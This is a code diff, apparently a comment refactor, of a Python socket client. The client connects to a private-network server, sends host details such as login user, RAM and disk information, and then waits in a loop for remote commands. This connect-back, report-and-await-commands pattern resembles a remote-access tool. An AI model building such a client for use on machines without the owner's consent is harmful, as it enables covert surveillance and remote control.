@@ -7,8 +7,9 @@ import subprocess
 import time
 
 checkConnectionPort = 23000
-serverName = '192.168.86.32'                           #corrisponde a 127.0.0.1
-
+serverName = '192.168.86.32'
+# usata solo per pairing iniziale, il S.O. assegna poi una porta
+serverPort = 6677
 
 def checkConnection():
     checkSocket = socket(AF_INET, SOCK_STREAM)
@@ -22,7 +23,6 @@ def checkConnection():
         time.sleep(5)
 
 
-serverPort = 6677                   #usata solo per pairing iniziale, il S.O. assegna poi una porta
 clientSocket = socket(AF_INET, SOCK_STREAM)
 
 
@@ -34,16 +34,16 @@ while True:
         continue
 
     break
-
-threadCheckConnection = threading.Thread(target=checkConnection, args=())   #dichiarato il thread che ha come target la funzione checkConnection e come argomento da passare connectionSocket
+# dichiarato il thread che ha come target la funzione checkConnection e come argomento da passare connectionSocket
+threadCheckConnection = threading.Thread(target=checkConnection, args=())
 threadCheckConnection.start()
 
 info = 'Uname:	' + ''.join(platform.uname()) + '\n Machine:	' + platform.machine() + '\n User:	' + os.getlogin() + \
        '\n RAM:	' + str(int(psutil.virtual_memory().total / 1048576)) + 'MB\n Disk Usage:	' \
        + str(psutil.disk_usage('/').percent) + ' Full%\n Disk File System:	' + str(psutil.disk_partitions())
 
-clientSocket.send(info.encode())                       #manda architettura
-ack = clientSocket.recv(1024).decode()                 #recv(1024) indica che riceviamo al massimo 1024 byte
+clientSocket.send(info.encode())
+ack = clientSocket.recv(1024).decode()
 command = clientSocket.recv(2048).decode()
 while command != 'exit':
     print(command)
